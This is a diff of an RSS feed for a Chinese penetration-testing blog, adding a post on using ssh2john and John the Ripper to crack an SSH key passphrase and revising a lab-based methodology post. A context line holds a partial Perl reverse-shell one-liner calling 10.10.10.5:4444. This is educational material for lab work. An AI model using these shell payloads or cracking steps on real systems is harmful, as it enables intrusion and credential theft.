@@ -1,4 +1,25 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 31 Dec 2025 08:29:33 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>使用GDB分析缓存区溢出漏洞</title><link>https://enilmalus.github.io/posts/%E4%BD%BF%E7%94%A8gdb%E5%88%86%E6%9E%90%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</link><pubDate>Wed, 31 Dec 2025 08:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E4%BD%BF%E7%94%A8gdb%E5%88%86%E6%9E%90%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</guid><description>&lt;h2 id="gdb-peda-分析"&gt;gdb-peda 分析&lt;/h2&gt;
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 01 Jan 2026 00:40:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
+└─$ ssh2john id_rsa | tee key_hash
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。&lt;/p&gt;
+&lt;p&gt;John 设计的初衷在于专注于高效破解，而不是兼顾解析和转换各种格式文件。各种密钥文件和加密数据都有自己独特的储存格式、加密参数和版本演变，内置所有解析逻辑会使得核心代码变得臃肿，增加维护难度和安全风险，同时也会分散团队在算法优化和并行处理上的精力。事实上，文件格式转换本身是一项非常复杂且不断演进的工作，许多转换工具最初由社区不同专家针对各自领域开发出来，这种分工使得每个工具都可以专注于特定格式的深度解析和不断更新，而 John 的核心开发者可以集中精力提升密码破解的速度和准确性。再者，不同格式的解析逻辑通常需要对各种加密协议和密钥派生函数有精确而细致的处理，若将这些所有细节内知道主程序中，不仅会增加软件整体的复杂度，还会使得未来支持新格式的工作变得更为繁琐和风险巨大。通过采用独立的 ssh2john 攻击，整个破解流程得以模块化：用户首先通过专门的转换工具提取破解所需的关键信息，再交由 John 进行针对性暴力破解或字典攻击，这样的架构既提高了灵活性，也确保了每个环节都能在各自领域达到最佳效果。&lt;/p&gt;
+&lt;h2 id="john-破解提取的私钥"&gt;John 破解提取的私钥&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
+└─$ john key_hash
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;John the Ripper 默认会按照一套预设的攻击策略以此尝试不同的破解模式。当不指定特定模式时，John 首先启动单一模式（Single crack mode），利用哈希文件中的信息（例如用户名、文件名等）生成候选密码并进行尝试；这就是输出模式中显示 “Proceeding with single,rule:Single” 所表达的含义。单一模式通常能在很短的时间内尝试一些最可能的密码组合，当 John 发现还有缓冲的候选密码没有处理完时，它会尽快完成这部分工作。接下来，John 会自动进入下一阶段，也就是使用默认字典进行攻击。如果前面两种都没有破解成功，John 就会启动最全面但是效率较低的增量模式（Incrementak mode），即基于 ASCII 字符的穷举攻击。整个流程的设计逻辑在于先用最后可能的密码组合进行快速尝试，再逐步扩大候选密码空间，再有限的时间内尽可能高效地覆盖大部分实际使用的密码组合。&lt;/p&gt;
+&lt;h3 id="fasttrack-字典"&gt;fasttrack 字典&lt;/h3&gt;
+&lt;p&gt;fasttrack.txt 时 Kali 中的一个轻量级 “常用弱口令字典” ，其优势在于体量小、命中率较高，开箱即用，但不会随着 Kali 的更新而更新。作为测试时的第一步爆破字典，它可以帮助安全人员快速验证目标是否使用了过于单一或过时的弱密码。对于需要兼顾速度与小笼包的渗透测试场景而言，先从 fasttrack.txt 入手，再逐步过渡到规模更大的字典列表是一种较为常见且易于实施的做法。&lt;/p&gt;</description><content type="html"><![CDATA[<h2 id="ssh2john-提取私钥">ssh2john 提取私钥</h2>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ ssh2john id_rsa | tee key_hash
+</code></pre><p>SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。</p>
+<p>John 设计的初衷在于专注于高效破解，而不是兼顾解析和转换各种格式文件。各种密钥文件和加密数据都有自己独特的储存格式、加密参数和版本演变，内置所有解析逻辑会使得核心代码变得臃肿，增加维护难度和安全风险，同时也会分散团队在算法优化和并行处理上的精力。事实上，文件格式转换本身是一项非常复杂且不断演进的工作，许多转换工具最初由社区不同专家针对各自领域开发出来，这种分工使得每个工具都可以专注于特定格式的深度解析和不断更新，而 John 的核心开发者可以集中精力提升密码破解的速度和准确性。再者，不同格式的解析逻辑通常需要对各种加密协议和密钥派生函数有精确而细致的处理，若将这些所有细节内知道主程序中，不仅会增加软件整体的复杂度，还会使得未来支持新格式的工作变得更为繁琐和风险巨大。通过采用独立的 ssh2john 攻击，整个破解流程得以模块化：用户首先通过专门的转换工具提取破解所需的关键信息，再交由 John 进行针对性暴力破解或字典攻击，这样的架构既提高了灵活性，也确保了每个环节都能在各自领域达到最佳效果。</p>
+<h2 id="john-破解提取的私钥">John 破解提取的私钥</h2>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ john key_hash
+</code></pre><p>John the Ripper 默认会按照一套预设的攻击策略以此尝试不同的破解模式。当不指定特定模式时，John 首先启动单一模式（Single crack mode），利用哈希文件中的信息（例如用户名、文件名等）生成候选密码并进行尝试；这就是输出模式中显示 “Proceeding with single,rule:Single” 所表达的含义。单一模式通常能在很短的时间内尝试一些最可能的密码组合，当 John 发现还有缓冲的候选密码没有处理完时，它会尽快完成这部分工作。接下来，John 会自动进入下一阶段，也就是使用默认字典进行攻击。如果前面两种都没有破解成功，John 就会启动最全面但是效率较低的增量模式（Incrementak mode），即基于 ASCII 字符的穷举攻击。整个流程的设计逻辑在于先用最后可能的密码组合进行快速尝试，再逐步扩大候选密码空间，再有限的时间内尽可能高效地覆盖大部分实际使用的密码组合。</p>
+<h3 id="fasttrack-字典">fasttrack 字典</h3>
+<p>fasttrack.txt 时 Kali 中的一个轻量级 “常用弱口令字典” ，其优势在于体量小、命中率较高，开箱即用，但不会随着 Kali 的更新而更新。作为测试时的第一步爆破字典，它可以帮助安全人员快速验证目标是否使用了过于单一或过时的弱密码。对于需要兼顾速度与小笼包的渗透测试场景而言，先从 fasttrack.txt 入手，再逐步过渡到规模更大的字典列表是一种较为常见且易于实施的做法。</p>
+]]></content></item><item><title>使用GDB分析缓存区溢出漏洞</title><link>https://enilmalus.github.io/posts/%E4%BD%BF%E7%94%A8gdb%E5%88%86%E6%9E%90%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</link><pubDate>Wed, 31 Dec 2025 08:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E4%BD%BF%E7%94%A8gdb%E5%88%86%E6%9E%90%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</guid><description>&lt;h2 id="gdb-peda-分析"&gt;gdb-peda 分析&lt;/h2&gt;
 &lt;p&gt;peda 是 Python Exploit Development Assistance 的缩写，这个工具是建立在 GDB 之上的，用 Python 编写的，旨在位利用开发提供版主。其设计初衷是为了让漏洞分析和利用开发过程更加直观高效，通过增强 GDB 的功能，如改进的堆栈、寄存器和内存显示，以及针对二进制分析和漏洞挖掘的实用工具，帮助安全研究人员更快地理解和利用程序中的漏洞。犹豫利用开发往往需要细致地分析程序执行状态、内存布局反编译代码，gdb-peda 的这些增强功能就显得尤为重要，能大大提升调试和漏洞利用的效率。&lt;/p&gt;
 &lt;h3 id="gdb-peda-下载"&gt;gdb-peda 下载&lt;/h3&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
@@ -1249,8 +1270,11 @@ Use &#34;--help [option]&#34; to view documentation for a given option
 </ul>
 <h4 id="-s-参数">-s 参数</h4>
 <p>静默模式，不显示进度条。</p>
-]]></content></item><item><title>渗透测试方法论</title><link>https://enilmalus.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</link><pubDate>Sat, 27 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</guid><description>&lt;blockquote&gt;
+]]></content></item><item><title>渗透测试通用方法论</title><link>https://enilmalus.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</link><pubDate>Sat, 27 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;本文章以笔者写过的 80 台靶机为样本做渗透测试方法论分析&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;本文章持续更新中&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2 id="靶机分类"&gt;靶机分类&lt;/h2&gt;
 &lt;h3 id="攻击链复杂度分层"&gt;攻击链复杂度分层&lt;/h3&gt;
@@ -1275,6 +1299,9 @@ Use &#34;--help [option]&#34; to view documentation for a given option
 &lt;pre tabindex="0"&gt;&lt;code&gt;版本识别 → CVE查询 → POC利用 → 过的初始立足点 → 基础
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如：&lt;/p&gt;</description><content type="html"><![CDATA[<blockquote>
 <p>本文章以笔者写过的 80 台靶机为样本做渗透测试方法论分析</p>
+</blockquote>
+<blockquote>
+<p>本文章持续更新中</p>
 </blockquote>
 <h2 id="靶机分类">靶机分类</h2>
 <h3 id="攻击链复杂度分层">攻击链复杂度分层</h3>
@@ -1350,9 +1377,6 @@ perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_ST
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ curl -s http://10.10.10.45/secret | trans -b :zh
 </code></pre><p>trans（translate-shell）是很不错的命令行翻译工具。</p>
-<blockquote>
-<p>本文章持续更新中</p>
-</blockquote>
 ]]></content></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>&lt;p&gt;在遇到目标网站且使用 &lt;em&gt;kali&lt;/em&gt; 默认的 &lt;em&gt;rockyou&lt;/em&gt; 字典爆破时间过长时可以尝试通过 &lt;em&gt;cewl&lt;/em&gt; 与 &lt;em&gt;john&lt;/em&gt; 结合生成目标定制的字典缩短爆破时间。&lt;/p&gt;
 &lt;h2 id="可能使用到的-cewl-及-john-命令及解释"&gt;可能使用到的 Cewl 及 john 命令及解释&lt;/h2&gt;
 &lt;h3 id="cewl-语句及其解释"&gt;Cewl 语句及其解释&lt;/h3&gt;
